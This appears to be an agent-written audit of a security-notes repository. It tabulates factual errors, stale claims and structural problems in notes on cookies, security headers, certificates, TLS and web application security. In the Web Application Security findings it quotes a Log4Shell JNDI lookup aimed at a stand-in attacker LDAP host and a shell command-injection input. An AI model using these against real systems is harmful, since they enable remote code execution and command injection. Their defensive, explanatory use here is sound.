| 1 | BROKEN | `# HTTP Cookies` | H1 does not match filename `Security Cookies.md`. | Align one to the other (suggest rename file to `HTTP Cookies.md`). | High |
| 11 | BROKEN | `## Cooke creation` | Heading typo (Cookie). | Fix. | High |
| 14 | WRONG | `` `Set-Cookie: <em>value</em>[; expires=<em>date</em>]...[; secure]` `` | Literal `<em>` HTML tags pasted from a web page inside inline code; omits `name=`; lists only the Netscape-era attributes and omits `Max-Age`, `HttpOnly`, `SameSite`, `Partitioned`. | `Set-Cookie: <name>=<value>[; Expires=<date>][; Max-Age=<n>][; Domain=<d>][; Path=<p>][; Secure][; HttpOnly][; SameSite=Strict|Lax|None][; Partitioned]`. | High |
| 20 | STALE | `IE 8 has a maximum of 50 cookies per domain ... Opera has a limit of 30 ... Safari and Chrome have no limit` | 2009-era numbers (IE8 and Presto-Opera are dead). RFC 6265 requires at least 50 per domain; Chromium enforces ~180 per domain and 3,000+ total; Firefox ~150 per domain (Unverified exact numbers). "Chrome no limit" is false. | Replace with RFC 6265 minimums and a note that current browsers cap at roughly 150-180 per domain. | High |
| 21 | WRONG | `The maximum size for all cookies sent to the server ... 4 KB. Anything over that limit is truncated` | The 4096-byte limit is **per cookie** (name+value+attributes, RFC 6265bis), not all cookies; browsers **reject** an over-size `Set-Cookie`, they do not truncate. | Fix both points. | High |
| 33 | STALE | `sameSite: 'strict' // Cookie only sent with same-site requests` (only SameSite mention) | Missing: Chromium defaults cookies without `SameSite` to **Lax** (Chrome 80, Feb 2020) with a 2-minute Lax+POST exception; `SameSite=None` **requires** `Secure`; Firefox/Safari do not default to Lax; `Strict` breaks top-level navigation from external links (login flows). `__Host-`/`__Secure-` prefixes not mentioned. Also **Partitioned** (CHIPS) attribute exists since 2023. | Add a SameSite section with the default behaviour, `None; Secure` rule, prefixes and CHIPS. | High |
| 26 | BROKEN | ```` ```javascript ```` Express example `app.use(session({...}))` | Missing `require`/import and `secret`; snippet will not run as written (fine as illustration but not labelled as partial). | Mark as fragment or complete it. | Low |
| 42-44 | STALE | `Cookies are used by online advertisers to track ... third-party cookies ... can generally be blocked` | Third-party cookie landscape changed: Safari (ITP, 2020) and Firefox (Total Cookie Protection, 2022) block/partition them by default; Chrome ran a 1% deprecation trial (Jan 2024) then **abandoned** third-party cookie deprecation (Jul 2024 / Apr 2025) in favour of CHIPS/Storage Access API. Not reflected in a 2025 file. | Add a paragraph on the current state (Unverified exact Chrome dates). | High |
| 48 | WRONG | `localStorage can store up to 10mb per domain` | Storage is scoped per **origin** (scheme+host+port), not per domain; that is the substantive error. The size figure is browser-dependent and fuzzy (commonly quoted 5 MB; Chromium 10 MB when counted in UTF-16 bytes). | "browser-dependent, roughly 5-10 MB per origin". | Medium |
| 53 | WRONG | `Can be bound to a single origin by using SameSite ... login.mysite.com to cdn.mysite.com would be considered a same-site request` | Internally contradictory: SameSite is **site**-scoped (registrable domain / eTLD+1), never origin-scoped, as the same cell then admits. The row labelled "SessionFixation" describes only one vector (subdomain cookie injection / cookie tossing) and omits the general attack (attacker plants a session ID before login) and its standard fix (regenerate the session ID on authentication). | State SameSite is site-scoped; add `__Host-` prefix as the mitigation for cookie tossing; add "regenerate session on login" for session fixation generally. | High |
| 52 | OPINION | `Malicious JS injection can be prevented by CSP` | CSP mitigates, does not prevent. | "mitigated by". | Low |
| 56 | STALE | `Not supported by anything before: IE 8, Firefox 3.5, Safari 4, Chrome 4` | Browser-support row for localStorage referencing 2009-2010 browsers; irrelevant in 2025. | Delete row. | High |
| 3-9 | DUPLICATE | Cookie basics | Overlaps the CSRF file's cookie explanation (CSRF lines 5) and the cookie/HttpOnly bullet in Cross Site Scripting.md line 28. | Make this the canonical cookie note; others link. | Medium |

---

## Security/Web Security/Security Headers.md (last commit 2023-06-22)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 6 | WRONG | `having X-Frame-Options set to Blocked` | `Blocked` is not a valid value; values are `DENY` and `SAMEORIGIN`. | `DENY`. | High |
| 12 | STALE | `create a whitelist of sources` | Terminology aside, host-allowlist CSPs are now considered weak (Google's "CSP Is Dead, Long Live CSP" 2016; bypasses via JSONP/Angular on allowed hosts). Current guidance is **strict CSP** with nonces/hashes + `'strict-dynamic'`. Not mentioned. | Add a "strict CSP" example: `script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'none'`. | High |
| 14 | WRONG | `the site's own origin (this excludes subdomains) and apis.google.com` with policy `default-src 'self' https://apis.google.com; object-src 'none'` | Text says "only allows script"; policy sets `default-src`, so it also governs img/style/font/connect etc. Minor but misleading. | Use `script-src` in the example or fix the prose. | Medium |
| 19 | WRONG | `CSP can block inline-eval in your javascript` | No such directive/keyword. The relevant keywords are `'unsafe-inline'` and `'unsafe-eval'`; and CSP violations *do* log to the console. | "`eval()` and inline scripts are blocked unless `'unsafe-eval'`/`'unsafe-inline'` (or nonces) are allowed; violations appear in the console and can be sent to `report-to`". | High |
| 23 | OPINION | `CSP is not applicable in case of APIs that are primarily data APIs` | OWASP REST Security cheat sheet recommends `Content-Security-Policy: frame-ancestors 'none'` (plus `X-Content-Type-Options`) on APIs because JSON responses can be rendered by browsers. Debatable claim stated as fact. | Soften; add OWASP API recommendation. | Medium |
| 27-37 | STALE | HSTS `max-age=31536000; includeSubDomains` | `preload` directive and hstspreload.org (which now requires max-age >= 1 year and `includeSubDomains; preload`) not mentioned; nor that Chrome now defaults to HTTPS-first (2023+). | Add `preload` and the preload-list caveat (hard to undo). | Medium |
| 39 | BROKEN | `### X-Frame-Options` | Nested as H3 under `## HSTS` although it is a sibling topic; every other header is H2. | Promote to H2. | Medium |
| 45 | WRONG | `X-Frame-Options: ALLOW-FROM https://example.com/` | `ALLOW-FROM` was only ever supported by IE/old Firefox, was removed from Firefox 70 (2019) and never worked in Chrome/Safari; presenting it as a usable option in a 2023 file is wrong-at-commit. The file's own line 48 says to use `frame-ancestors`. | Remove or mark "obsolete, unsupported". | High |
| 48 | WRONG | `X-Frame-Options ... was never standardized` | It was standardised informationally as RFC 7034 (2013); "obsoleted by CSP frame-ancestors" is the accurate statement. | Fix. | Medium |
| 60 | STALE | `X-Content-Type-Options ... only has one valid value, nosniff` | Correct; could add that `nosniff` also enables CORB/ORB protections. | Optional. | Low |
| 64 | OPINION | `I know that 4,000 users came from Twitter this week because when they visit my site` | First-person anecdote copied from Scott Helme's blog, presented in the note's own voice. | Attribute or remove. | High |
| 62-66 | STALE | Referrer Policy section lists no values | No policy values (`no-referrer`, `same-origin`, `strict-origin-when-cross-origin`, ...) and no mention that browsers default to `strict-origin-when-cross-origin` (Chrome 85 / Firefox 87 / Safari, 2020-2021, before commit). | Add value table and default. | High |
| 68-82 | WRONG | `## Cross-Origin-Resource-Policy` section body explains **Same-Origin Policy** and **CORS** | Section title is CORP but 90% of the text is SOP/CORS. CORP is a *different* mechanism (blocks no-cors embedding of your resources by other origins, Spectre defence). Line 82 `By setting Cross-Origin-Resource-Policy: cross-origin ... the target service tells the browser that it wants to allow cross-origin requests` is wrong - CORP does not grant cross-origin *reads*; only CORS (`Access-Control-Allow-Origin`) does. | Retitle section "Same-Origin Policy and CORS"; move CORP to the COOP/COEP section with a correct one-paragraph definition. | High |
| 76 | WRONG | `same origin policy applies only to scripts ... dynamically-loaded scripts can be accessed across origins` | SOP applies to script *access to* cross-origin data, not "only to scripts". Cross-origin `<script src>` executes but its source cannot be read; images can be displayed but not read via canvas. "with fonts being a notable exception" is right, but the sentence as a whole is misleading. | Rephrase: "SOP restricts *reading* cross-origin responses; embedding (`<img>`, `<script>`, `<link>`) is allowed but opaque". | Medium |
| 96-100 | WRONG | `CORS restriction within this response can prevent foo.com in browser from loading it` | CORS *relaxes* SOP; it is the absence of CORS headers (SOP) that blocks the read. Wording inverts cause and effect, though the parenthetical on line 100 corrects it. | Fix sentence 3. | Medium |
| 104 | STALE | `Cross-origin isolation is a new security feature (as of April 2021)` | Not new in 2023, and COEP now has `credentialless` (Chrome 96, Firefox 119) as an easier alternative to `require-corp`; not mentioned. | Update; add `credentialless`. | Medium |
| 119-122 | OPINION | `For security purposes, the browser default should be same-origin, That shift is going to take some time` | Speculation with no source; browsers have not changed CORP default and are unlikely to. | Remove. | Medium |
| 128-136 | STALE | `X-XSS-Protection` under `## Deprecated` (lists values 0, 1, 1; mode=block) | Deprecation is correctly stated (removed Chrome 78 in 2019, never in Firefox, removed Safari 15.4), but the block still documents `1` variants as if usable; OWASP now recommends only `X-XSS-Protection: 0` (or omitting the header). | Keep only `X-XSS-Protection: 0` and say why. | Low |
| 138-139 | STALE | `Feature Policy ... Permissions-Policy header replaces` | Correct, but no example and no mention of the structured-header syntax `Permissions-Policy: camera=(), geolocation=(self)`. | Add example. | Low |
| - | CLASSIFY | Whole file | Contains SOP/CORS conceptual material that would be better in a "Browser security model" note linked from here, Cookies and CSRF. | Split. | Medium |

---

## Security/Web Security/TLS Certificates.md (last commit 2022-06-30)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 1 | BROKEN | `# What is a Certificate?` | H1 is a question and does not match filename `TLS Certificates.md`. | `# TLS Certificates`. | High |
| 26 | WRONG | `-days 356 -nodes` | Typo: 356 vs 365 (line 36 uses 365). Harmless but a copy-paste trap. | 365. | High |
| 30-40 | WRONG | CSR/cert generated with only `-subj '/CN=demo.applicant.com/...'` | No **Subject Alternative Name** extension. Chrome 58+ (2017), Safari, Firefox and Go/Java clients reject certificates without SAN (CN is ignored). The recipe produces a certificate no modern browser will accept - wrong at commit. | Add `-addext "subjectAltName=DNS:demo.applicant.com"` on the CSR and `-copy_extensions copy` (OpenSSL 3) or an `-extfile` on signing. | High |
| 36 | STALE | `openssl x509 -req -sha256 -days 365` (no discussion of lifetime limits) | Public TLS cert lifetimes: max 398 days since Sep 2020 (Apple/CA-B Forum); CA/B Forum Ballot **SC-081v3** (Apr 2025) reduces to **200 days from 15 Mar 2026** (already in force today), **100 days from 15 Mar 2027**, **47 days from 15 Mar 2029**; DCV reuse drops to 10 days. Verified. | Add a "Validity limits" section with this schedule and an "automate with ACME" recommendation. | High |
| 9 | STALE | `digital certificate (formerly called SSL certificate) ... is not so great at 3 [renewable]` | With ACME/Let's Encrypt (2015) renewal is fully automated; the claim is out of date and the file never mentions **ACME**, **Let's Encrypt**, or `certbot` beyond one link. | Add an ACME paragraph. | High |
| 49 | BROKEN | `“—–BEGIN CERTIFICATE—–”` | Smart quotes and em/en dashes pasted from a web page; the real delimiter is `-----BEGIN CERTIFICATE-----` (five hyphens). Copying this breaks parsing. | Use plain ASCII in backticks. | High |
| 61 | BROKEN | `.pfx - ... protected with a pfx password. (end entity certificate, intermediate certificates, root authority certificates and private key) in a single file.` | Duplicated sentence fragment (the parenthetical repeats the previous sentence). | Tidy. | Low |
| 61 | STALE | PKCS#12 `.pfx` (no algorithm note) | Legacy PFX files use RC2-40/3DES/SHA-1 (`-legacy` in OpenSSL 3); modern PKCS#12 uses AES-256-CBC + PBKDF2. OpenSSL 3 (Sep 2021, before commit) changed the default and breaks old importers. | Add one line. | Medium |
| 70 | BROKEN | `On a Linux host 'trustung' the certificate is different` | Typo (trusting) and missing punctuation. | Fix. | Low |
| 71 | WRONG | `Import-PfxCertificate -FilePath certificate.pfx -CertLocation 'Cert:\LocalMachine\Root' -Password 'password'` | Parameter is `-CertStoreLocation`, not `-CertLocation`; `-Password` requires a `SecureString` (`(ConvertTo-SecureString 'password' -AsPlainText -Force)`), a plain string fails. | Fix both. | High |
| 77 | STALE | `purchase a public domain name ... and then get a publicly-trusted certificate for it` | Should note the certificate is free via Let's Encrypt/ZeroSSL with DNS-01 challenge (works for internal hosts). | Add. | Medium |
| 81 | WRONG | `A thumbprint ... identifies the public key of the certificate. The thumbprint is almost certainly contained in the signature of the request` | A certificate thumbprint/fingerprint is the hash (SHA-1/SHA-256) of the **entire DER-encoded certificate**, not of the public key (the public-key hash is the Subject Key Identifier / SPKI hash used for pinning). The second sentence is unsupported speculation ("almost certainly"). | Correct definition; delete second sentence. | High |
| 87 | STALE | `SAN certificates are different from wildcard certificates` | Fine, but wildcards are now free via ACME DNS-01 and every publicly trusted cert *is* a SAN cert (CN alone is invalid). Distinction is "multi-domain vs wildcard". | Reword. | Medium |
| 95 | STALE | `## Certificate Revocation List (CRL)` (only revocation mechanism) | No **OCSP**, **OCSP stapling**, `Must-Staple`, or the fact that browsers use aggregated lists (Chrome CRLSets, Firefox **CRLite**); Let's Encrypt **ended OCSP** support in 2025 (Unverified exact month) and the CA/B Forum made OCSP optional for CAs (2023). | Add a revocation section covering these. | High |
| 47-62 | DUPLICATE | Encoding formats | None in repo; fine. Cert *types* (DV/OV/EV) however live in `Transport Layer Security.md` lines 52-88, which is the wrong file. | Move DV/OV/EV/OID section here. | High |

---

## Security/Web Security/Transport Layer Security.md (last commit 2022-06-30)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 1 | BROKEN | `# HTTPS` | H1 does not match filename `Transport Layer Security.md`. | `# Transport Layer Security (TLS) and HTTPS`. | High |
| 12 | STALE | `using a strong protocol version and cipher suite` (no versions anywhere in the file) | The TLS note never names a TLS version. TLS 1.0/1.1 formally deprecated by **RFC 8996** (Mar 2021, before commit) and disabled in all major browsers since 2020; **TLS 1.3** (RFC 8446, Aug 2018) is current: 1-RTT handshake, 0-RTT resumption, only AEAD suites (AES-GCM, ChaCha20-Poly1305), forward secrecy mandatory, encrypted certificates/SNI-encryption (ECH) possible. | Add a "Versions" section with this. | High |
| 17 | OPINION | `therefore between layer 4 and 7` | Reasonable, but usually described as "layer 5/6 or session/presentation; sits above TCP". Fine as is with a source. | Keep, mark as conceptual. | Low |
| 35 | WRONG | `the web browser then generates a new secret key and encrypts it with the websites public key so that the secret can be shared` | Describes **RSA key transport**, which was removed from TLS 1.3 and is discouraged in 1.2 (no forward secrecy). Modern handshakes use ephemeral (EC)DHE: both sides derive the shared secret; nothing is "encrypted with the website's public key". The certificate's key is used only to **sign** the handshake. Was already the norm at commit. | Rewrite handshake description around ECDHE + signature; note RSA key exchange as legacy TLS <=1.2. | High |
| 44 | STALE | `The two most popular key exchange algorithms are RSA ... and Diffie-Hellman` | TLS 1.3 uses only (EC)DHE (X25519 most common); and since 2024-2025 Chrome, Firefox, Cloudflare and OpenSSL 3.5 default to hybrid post-quantum **X25519MLKEM768** (Unverified rollout dates). "Diffie-Helmlman-Merkle" typo. | Update; fix typo. | High |
| 23, 30, 37, 46 | BROKEN | `![certificate](https://latex.codecogs.com/png.latex?...)` | Formulae are remote-rendered images from a third-party LaTeX service; if it is down the note has holes, and alt text is a single word. | Inline as code: `cert = Sign_CA_sk(dnsName, publicKey)`. | Medium |
| 54 | STALE | `you can pay anything from $5 to thousands of dollars for a certificate` | DV certificates have been free (Let's Encrypt) since 2015; the "$5" framing predates commit. | "free (ACME) to thousands". | High |
| 65 | STALE | `When the site has EV, the organisation name and the country of origin is displayed along with the URL in the browser (Chrome & Firefox) address bar` | Chrome 77 and Firefox 70 (both Sep/Oct **2019**) removed the EV indicator from the address bar; Safari followed. Supersession predates the 2022 commit. | State that no browser shows EV in the URL bar; EV info is only in the certificate viewer, and EV has little practical security value. | High |
| 67 | OPINION | `You are probably going to pay more than 3 times for and EV certificate` | Anecdotal from Troy Hunt post (2018). | Attribute. | Low |
| 75 | OPINION | `on the certificate issued to https://hemantkumar.net Policy Identifier=2.23.140.1.2.1` | Personal-site example; fine, but the Let's Encrypt CPS OID `1.3.6.1.4.1.44947.1.1.1` was **removed** from Let's Encrypt certs in 2024 (Unverified) - example may no longer reproduce. | Note it is a snapshot. | Low |
| 92 | WRONG | `The client sends a TLS client certificate for every request to the server` | The client certificate is sent once during the TLS **handshake** (per connection), not per HTTP request. | Fix. | Medium |
| 92 | STALE | mTLS section | No mention of SPIFFE/SPIRE or service-mesh mTLS (the repo's Kubernetes note covers service mesh). | Cross-link `Cloud and Infrastructure/Kubernetes/Overview.md`. | Low |
| 52-88 | CLASSIFY | `## How do you decide the type of SSL certificate` through OID section | Certificate-type content (DV/OV/EV, CT, OIDs) belongs in `TLS Certificates.md`, leaving this file to cover the protocol. | Move. | High |
| 3-7 | DUPLICATE | Confidentiality/Integrity/Authenticity | Same triad explained in `Data Security.md` line 82. | Cross-link. | Low |

---

## Security/Web Security/Web Application Security.md (last commit 2023-04-27)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 1 | BROKEN | (blank line 1, H1 on line 2) | Leading blank line before H1. | Remove. | Low |
| 54, 72 | STALE | `Coverity from Synopsis` / `Vendors like Snyk, Synopsis, mend.io` | Misspelt (**Synopsys**); Synopsys' Software Integrity Group was spun out as **Black Duck Software** (Oct 2024). | "Coverity (Black Duck, formerly Synopsys)". | High |
| 57 | STALE | `Semmle - part of GitHub Advanced Security` | The product is **CodeQL** (Semmle was the acquired company, 2019). | Rename. | Medium |
| 52 | OPINION | `Snyk code | https://semgrep.dev/ provide fast scanning` | Two unrelated vendors joined with a pipe; reads as if Semgrep is Snyk. | Separate bullets. | Low |
| 61 | OPINION | `According to an Accenture & WEF security report, supply chain attacks were highlighted as a major cyber threat` | Uncited. | Cite (WEF Global Cybersecurity Outlook 2023). | Low |
| 62 | WRONG | `It affected more than 30,000 public & private orgs using the Orion` | SolarWinds reported ~33,000 Orion customers, of whom **fewer than 18,000** installed the trojanised update and far fewer were actively exploited (~100). "Affected 30,000" overstates (Unverified exact figures). | "~18,000 downloaded the backdoored update; ~100 actively targeted". | Medium |
| 77 | CLASSIFY | `Open VAS - Open Vulnerability Assessment Scanner` listed under DAST | OpenVAS/Greenbone is a **network/host** vulnerability scanner, not a web-app DAST tool. | Move to vulnerability-management tooling. | Medium |
| 80 | STALE | `comparison with Netsparker` | Netsparker rebranded **Invicti** (2021, before commit). Also Burp Suite Enterprise now exists specifically for CI automation, so the "less focussed on automation" claim is dated. | Update. | Medium |
| 88 | STALE | `The OWASP Top 10 provides list of the 10 Most Critical Web Application Security Risks` (no version; link to old wiki cheat sheet) | Bullets (Broken Access Control, Identification and Authentication Failures, Injection incl. XSS) match **Top 10:2021**, but the version is never named. **OWASP Top 10:2025** was finalised Jan 2026: new A03 Software Supply Chain Failures and A10 Mishandling of Exceptional Conditions; SSRF merged into Broken Access Control; Security Misconfiguration up to #2; A07 renamed Authentication Failures. Verified. | Name the version; add a 2021 -> 2025 delta. | High |
| 90-98 | BROKEN | List structure | Only 3 of the 10 categories listed, with the authentication bullet expanding into API auth techniques (a different topic). | Either list all 10 or retitle the section "Selected risks". | Medium |
| 111 | BROKEN | `os.system(f"{e} {input})"` | Quote/paren misplaced - this is a Python SyntaxError. Should be `os.system(f"{e} {input}")`. Also `input` shadows a builtin. | Fix. | High |
| 120 | WRONG | `subprocess.call([e,input])` -> `# output hello world && ls -al` / `0` | Correct behaviour, but the comment "ensuring the inputs are properly escaped" is inaccurate: list-form `subprocess` avoids the shell entirely (no escaping happens). | "avoids the shell, so no injection". | Medium |
| 138, 141 | BROKEN | `"$jndi:ldap://my-evil-ldap/maliciousobject}"` | Log4Shell payload is `${jndi:ldap://...}`; the opening `{` is missing in both examples, so the snippet as written would not trigger the lookup. | Add `{`. | High |
| 150 | STALE | `ModSecurity ... used by over a million sites` | Unsourced marketing figure. | Remove or cite. | Low |
| 155 | STALE | `commercial TrustWave rule set (rule package updated daily)` | Trustwave ended sale (Aug 2021, before commit) and support (**1 Jul 2024**) of ModSecurity and its commercial rules; custodianship of ModSecurity moved to **OWASP** (Jan 2024). Verified. | Update: "OWASP ModSecurity (Trustwave stewardship ended 2024); commercial rules discontinued". | High |
| 158 | STALE | `ModSecurity 3.0 ... runs natively in NGINX ... compiled and installed for open source nginx` | F5 declared NGINX ModSecurity WAF **EOL 31 Mar 2024**; the libmodsecurity v3 nginx connector remains community-maintained, and **OWASP Coraza** is the Go-native CRS-compatible successor used by Caddy/Envoy/Kubernetes ingress. Verified (F5 EOL). | Add Coraza and the F5 EOL. | High |
| 169 | STALE | `NTP amplification ... monlist ... up to 600 times` | Amplification factor for monlist is usually quoted as ~556x (Cloudflare) - fine; but it is a 2014-era vector; modern amplification is Memcached/DNS/CLDAP/HTTP/2 Rapid Reset. | Add one line on current vectors. | Low |
| 178 | STALE | `Chrome shows a yellow triangle over the padlock to warn the user` | Chrome removed the padlock icon entirely (Chrome 117, Sep 2023) and has auto-upgraded/blocked mixed content since Chrome 86 (2020, before commit). | Update. | High |
| 180 | STALE | `https://observatory.mozilla.org` | Rebuilt as **MDN HTTP Observatory** (2024). | Update name. | Low |
| 146 | CLASSIFY | WAF / ModSecurity section | Overlaps `Cloud and Infrastructure/Nginx.md` (lines 28-30, WAF) and `Cloud and Infrastructure/Kubernetes/Overview.md` (line 163, ModSecurity on HAProxy ingress). | Keep concept here, tooling in Nginx.md, cross-link. | Medium |
| - | CLASSIFY | Whole file (200 lines) | Mixes: security requirements/process (6-28), tooling catalogue SAST/IAST/SCA/DAST/pentest (30-84), OWASP risks (86-142), WAF/DDoS (144-171), browser protections (173-189), learning resources (191-200). | Split into "AppSec programme and tooling" and "Web application risks (OWASP Top 10)". | High |

---

## File classification

| File | H1 title | Kind | Status | Audience | Suggested tags | One-line summary | Consolidation note |
|---|---|---|---|---|---|---|---|
| Security/Certification.md | (none) | index | stale | engineers/managers choosing certs | security-certifications, cissp, ceh, crest, cyber-essentials | Four bare links to individual certs plus a paragraph on the UK Cyber Essentials scheme. | Merge into Compliance.md; add H1. |
| Security/Cloud Security.md | Cloud Security Controls Framework | reference | partially-stale | cloud/security architects | cloud-security, nist-csf, csa-ccm, cis-benchmarks, siem-soar, azure-defender | Frameworks (NIST, MITRE, CSA, CIS), a technical control checklist, AWS audit tools and Azure SIEM notes. | Fix H1; move Azure product notes to Cloud and Infrastructure/Azure; update NIST CSF 2.0 and Microsoft product names. |
| Security/Compliance.md | Compliance | reference | partially-stale | engineers meeting audit requirements | compliance, pci-dss, iso-27001, soc2, fips-140, gdpr | Overview of ISO/SOC/PCI/FIPS standards with a detailed (dated) FIPS algorithm list. | Canonical home for standards; absorb Certification.md and Data Security's PCI/GDPR; move Schannel/PKCS to TLS notes. |
| Security/Container Security.md | Container Security | cheatsheet | archive-candidate | container platform engineers | container-security, docker, content-trust, tuf, supply-chain | Fragmentary 2017-era Docker talk notes on content trust, TUF, DTR and Swarm. | Rewrite as image-signing/SBOM/runtime hardening note or archive. |
| Security/Data Security.md | Data Security | conceptual-essay | partially-stale | developers handling PII / crypto basics | pii, gdpr, schrems-ii, pci-dss, cryptography, hashing | PII and GDPR/Schrems primer followed by encryption/hash/MAC/encoding fundamentals with several factual errors. | Split into Data Privacy (merge regulatory bits with Compliance) and Cryptography Basics (fix hash/MAC table). |
| Security/Endpoint Security.md | Endpoint Security | reference | partially-stale | IT security / SOC | endpoint-security, edr, epp, virustotal, yara, vulnerability-management | EPP vs EDR, how to read VirusTotal results, YARA hunting, and BeyondTrust/Tenable vulnerability-management vendor notes. | Split VirusTotal/YARA into Malware Analysis; move VM and PAM discovery out; fix two heading typos. |
| Security/Storing secrets.md | Storing secrets | cheatsheet | partially-stale | developers | gpg, git-signing, blackbox, secrets-in-git | GPG key commands and StackExchange Blackbox workflow for encrypting files in a repo. | Rename to GPG/encrypted-files-in-Git, or expand to cover Vault/KMS/SOPS and link AWS Secrets Manager notes. |
| Security/Threat Modelling.md | Threat Modelling | conceptual-essay | partially-stale | engineers/architects | threat-modelling, stride, attack-surface, security-principles, owasp | Purpose and steps of threat modelling, attack-surface reduction, and secure-design principles. | Add STRIDE/PASTA/LINDDUN/DREAD and 4th question; fix Open Design definition; extract principles. |
| Security/Web Security/Cross Site Request Forgery.md | Cross Site Request Forgery | conceptual-essay | partially-stale | web developers | csrf, anti-csrf-token, samesite, cookies, owasp | Explains CSRF via authenticated cookies and the anti-CSRF token defence (Troy Hunt derived). | Fix broken fence; add SameSite/Fetch Metadata as defence-in-depth while keeping tokens primary. |
| Security/Web Security/Cross Site Scripting.md | Cross Site Scripting | cheatsheet | partially-stale | web developers | xss, output-encoding, httponly, csp, owasp | Three XSS types and a short mitigation list focused on escaping and HttpOnly. | Correct the img payload and "unicode" claim; lead with output encoding; add CSP/Trusted Types; link Headers/Cookies. |
| Security/Web Security/Security Cookies.md | HTTP Cookies | reference | stale | web developers | cookies, samesite, httponly, secure, localstorage, third-party-cookies | Cookie purpose, Set-Cookie syntax, browser limits, security attributes and a cookies-vs-localStorage comparison. | Committed 2025 but content is 2009-era; fix H1/filename, limits, SameSite defaults, CHIPS, cookie-tossing row. |
| Security/Web Security/Security Headers.md | Security Headers | reference | partially-stale | web developers/ops | security-headers, csp, hsts, cors, coop-coep, referrer-policy | Tour of CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy, CORS/SOP, COOP/COEP and deprecated headers. | Retitle CORP section as SOP/CORS; add strict CSP, Referrer-Policy values, HSTS preload; remove ALLOW-FROM. |
| Security/Web Security/TLS Certificates.md | What is a Certificate? | reference | partially-stale | developers/ops | x509, csr, openssl, pem-der-pkcs12, san, revocation | Certificate concepts, OpenSSL CA/CSR recipe, encoding formats, self-signed trust, SAN, SNI and CRL. | Fix H1; add SAN to recipe; add validity limits (398 -> 47 days), ACME, OCSP/CRLite; absorb DV/OV/EV from TLS file. |
| Security/Web Security/Transport Layer Security.md | HTTPS | conceptual-essay | partially-stale | developers | tls, https, handshake, key-exchange, dv-ov-ev, mtls | How HTTPS/TLS provides CIA, a (legacy RSA) handshake walkthrough, certificate types and TLS client auth. | Fix H1; add TLS versions and ECDHE/1.3 handshake; remove EV address-bar claim; move cert types to TLS Certificates. |
| Security/Web Security/Web Application Security.md | Web application security | reference | partially-stale | AppSec / dev leads | appsec, sast-dast-sca, owasp-top-10, waf, ddos, supply-chain | AppSec programme thinking, SAST/IAST/SCA/DAST/pentest tooling catalogue, OWASP risks with code samples, WAF/DDoS and browser protections. | Split tooling catalogue from risks; name OWASP Top 10 version (2021 -> 2025); update ModSecurity/vendor names; fix code snippets. |

---

## Cross-file observations

**Naming / navigation problems an agent will hit first**
- Four H1s do not match filenames: `Cloud Security.md` ("Cloud Security Controls Framework"), `Security Cookies.md` ("HTTP Cookies"), `TLS Certificates.md` ("What is a Certificate?"), `Transport Layer Security.md` ("HTTPS"). `Certification.md` has no H1 at all. An agent indexing by title will not find the TLS protocol file under "TLS".
- Content is in the wrong file for its title: the **TLS protocol** file spends lines 52-88 on certificate types (DV/OV/EV, CT, OIDs) that belong in `TLS Certificates.md`, while the protocol file never states a TLS version. The **Security Headers** "Cross-Origin-Resource-Policy" section is actually about Same-Origin Policy and CORS. `Storing secrets.md` is GPG + Blackbox, not secret storage.

**Duplicates and splits**
- PCI DSS is described in both `Compliance.md` (30-34) and `Data Security.md` (72-78), with different (and in Data Security, wrong) attribution of who authors it. Keep one, in Compliance.
- Regulatory/standards content is split across three files: ISO/SOC/PCI/FIPS in Compliance, GDPR/Schrems in Data Security, Cyber Essentials in Certification. Suggest `Compliance.md` becomes the single "Regulations, standards and certifications" note.
- Secure-design principles appear in `Threat Modelling.md` (43-54) and defence-in-depth in `Web Application Security.md` (4). Extract to a `Security Principles.md`.
- WAF/ModSecurity appears in `Web Application Security.md`, `Cloud and Infrastructure/Nginx.md` and `Cloud and Infrastructure/Kubernetes/Overview.md`. Keep the concept in Security, tooling in Nginx, and cross-link.
- Cookie/HttpOnly explanations recur in CSRF, XSS and Cookies files without links; make `Security Cookies.md` canonical.
- Cloud tool table and Azure Defender/Sentinel content in `Cloud Security.md` overlaps `Cloud and Infrastructure/AWS/Security.md` and belongs beside `Cloud and Infrastructure/Azure/`.

**SameSite is discussed in none of the three files where it matters.** `Security Cookies.md` has a one-line `sameSite: 'strict'` code comment; `Cross Site Request Forgery.md` and `Security Headers.md` never mention it. An agent asked "do I still need CSRF tokens?" would get no answer. Recommended single statement (in CSRF, linked from Cookies): Chromium defaults to `SameSite=Lax` (Chrome 80, 2020) with a 2-minute Lax+POST exception; Firefox/Safari do not; `SameSite=None` requires `Secure`; OWASP still treats synchronizer/signed-double-submit tokens as the primary defence and SameSite + `Sec-Fetch-Site` checks as defence-in-depth.

**Topics the parent asked about that are absent from the whole set** (gaps, not errors):
- Password hashing algorithms (Argon2id, scrypt, bcrypt, PBKDF2 600k iterations) - only a generic "salt" sentence in Data Security 134.
- Secret stores (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager, SOPS) - only AWS Secrets Manager exists, under `Cloud and Infrastructure/AWS/Security.md`.
- Threat-modelling methodologies (STRIDE, PASTA, LINDDUN, DREAD, attack trees) and tools.
- TLS versions (1.0/1.1 deprecated RFC 8996; 1.3 RFC 8446; PQ hybrid X25519MLKEM768).
- Certificate lifetime limits (398 days; SC-081v3: 200 days from 15 Mar 2026, 100 from 15 Mar 2027, 47 from 15 Mar 2029) and ACME automation.
- Referrer-Policy values and the `strict-origin-when-cross-origin` default; strict (nonce/hash) CSP; HSTS preload; Permissions-Policy syntax.
- OWASP Top 10 version (bullets are 2021; 2025 edition final Jan 2026).
- ISO 27001:2022 edition, PCI DSS 4.0.1, FIPS 140-3 / 140-2 sunset (21 Sep 2026), NIST CSF 2.0 "Govern".

**Highest-impact factual errors to fix first (would actively mislead an agent)**
1. `Data Security.md` 88: MAC and digital signatures marked as providing confidentiality.
2. `Data Security.md` 126-132: hash definitions (collisions "cannot" exist, preimage vs collision resistance swapped, hashes "provide confidentiality via encryption").
3. `TLS Certificates.md` 30-40: OpenSSL recipe produces a SAN-less certificate that browsers reject; 81: thumbprint definition wrong.
